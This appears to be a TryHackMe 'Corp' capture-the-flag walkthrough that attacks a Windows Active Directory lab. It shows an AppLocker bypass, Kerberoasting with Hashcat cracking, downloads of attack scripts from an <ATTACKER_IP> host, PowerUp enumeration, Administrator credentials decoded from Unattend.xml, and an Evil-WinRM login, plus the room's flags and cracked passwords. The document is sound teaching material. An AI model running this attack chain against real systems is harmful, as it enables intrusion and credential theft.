# TryHackMe – Corp: Detailed Walkthrough

## Table of Contents
1. [Initial Access & AppLocker Bypass](#1-initial-access-applocker-bypass)
2. [Enumerating Service Principal Names (SPNs)](#2-enumerating-service-principal-names-spns)
3. [Kerberoasting Attack](#3-kerberoasting-attack)
4. [Lateral Movement as `fela`](#4-lateral-movement-as-fela)
5. [Privilege Escalation to Administrator](#5-privilege-escalation-to-administrator)
6. [Accessing the Administrator Account](#6-accessing-the-administrator-account)
7. [Summary of Attack Path](#7-summary-of-attack-path)
8. [Key Takeaways](#8-key-takeaways)

An Active Directory-based penetration testing and privilege escalation exercise.

# 1. Initial Access & AppLocker Bypass
## 1.1 Finding a PowerShell Execution Vector

AppLocker restricts certain executables, but PowerShell-related processes are often allowed.
Two common paths were identified:

- **PowerShell ISE:** C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
- **PowerShell console:** C:\Windows\System32\WindowsPowerShell\v1.0\ps.exe

Using PowerShell ISE, we can bypass AppLocker and execute commands.
## 1.2 Retrieving the First Flag

After launching PowerShell ISE, the command to read the PowerShell history file was executed:
powershell

    Get-Content "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

This revealed the first flag:
flag{a12a41b5f8111327690f836e9b302f0b}
# 2. Enumerating Service Principal Names (SPNs)
## 2.1 Discovering SPN Accounts

To identify user accounts with Service Principal Names (useful for Kerberoasting), the following Active Directory query was used:
powershell

    Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null} | Select-Object SamAccountName, ServicePrincipalName

This revealed that the user fela had an SPN:
text

    HTTP/fela

# 3. Kerberoasting Attack
## 3.1 Downloading the Kerberoasting Script

The Invoke-Kerberoast.ps1 script was hosted using a Python HTTP server:
bash

    python3 -m http.server

From the victim machine, the script was downloaded using PowerShell:
powershell

    Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/Invoke-Kerberoast.ps1 -OutFile Invoke-Kerberoast.ps1

## 3.2 Executing the Script and Extracting TGS Hashes

After loading the script, the following command was executed:
powershell

    . .\Invoke-Kerberoast.ps1
    Invoke-Kerberoast -OutputFormat Hashcat

This produced a Kerberos TGS hash for the user fela:
text

$krb5tgs$23$*fela$corp.local$HTTP/fela*$CC457DD27ED0E1CCF12FE10AB6C97AFE$55572B...

## 3.3 Cracking the Hash with Hashcat

The hash was saved to hash.txt and cracked using rockyou.txt:
bash

    echo '$krb5tgs$23$*fela$corp.local$HTTP/fela...' > hash.txt
    hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

**The password was successfully cracked:**
rubenF124

**Credentials obtained:**
fela:rubenF124
# 4. Lateral Movement as fela

Using the cracked credentials, we logged in as fela and retrieved the second flag:
flag{bde1642535aa396d2439d86fe54a36e4}
# 5. Privilege Escalation to Administrator
## 5.1 Downloading PowerUp.ps1

The PowerUp.ps1 script was hosted using Python:
bash

    python3 -m http.server

On the target machine, the script was downloaded:
powershell

    Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/PowerUp.ps1 -OutFile Invoke-PowerUp.ps1

## 5.2 Running PowerUp Checks

After loading the script, a comprehensive system check was performed:
powershell

    . .\Invoke-PowerUp.ps1
    Invoke-AllChecks

## 5.3 Finding Encoded Credentials in Unattend.xml

The check revealed an Unattend.xml file containing Base64-encoded credentials:
powershell

Get-Content C:\Windows\Panther\Unattend\Unattended.xml

Output:
xml

        <AutoLogon>
            <Password>
                <Value>dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=</Value>
                <PlainText>false</PlainText>
            </Password>
            <Enabled>true</Enabled>
            <Username>Administrator</Username>
        </AutoLogon>

## 5.4 Decoding the Base64 Password

The encoded value was decoded to plaintext:

**Encoded:** dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
**Decoded:** tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T

**Administrator credentials obtained:**
Administrator:tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
# 6. Accessing the Administrator Account
## 6.1 Using Evil-WinRM for Remote Access

The credentials were used to log in via Evil-WinRM:
bash

        evil-winrm -i 10.81.188.218 -u Administrator -p 'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T'

## 6.2 Retrieving the Final Flag

Once logged in, the flag was read from the Administrator’s desktop:
powershell

        type C:\Users\Administrator\Desktop\flag.txt

Final Flag:
THM{g00d_j0b_SYS4DM1n_M4s73R}
# 7 Summary of Attack Path
- Bypassed AppLocker via PowerShell ISE → Retrieved first flag from PowerShell history.
- Enumerated SPNs → Identified fela as a Kerberoastable account.
- Kerberoasted fela → Cracked TGS hash to obtain credentials.
- Lateral movement → Logged in as fela and retrieved second flag.
- Privilege escalation → Used PowerUp to find encoded Administrator credentials in Unattend.xml.
- Decoded credentials → Logged in as Administrator and captured final flag.

# 8 Key Takeaways
- AppLocker Bypass: PowerShell ISE is often an allowed execution vector.
- Kerberoasting: A reliable technique for obtaining crackable hashes from service accounts.
- Unattended Files: Always check for leftover deployment files (Unattend.xml, sysprep.inf, etc.) as they may contain credentials.
- Automated Enumeration: Tools like PowerUp can quickly identify misconfigurations and stored credentials.
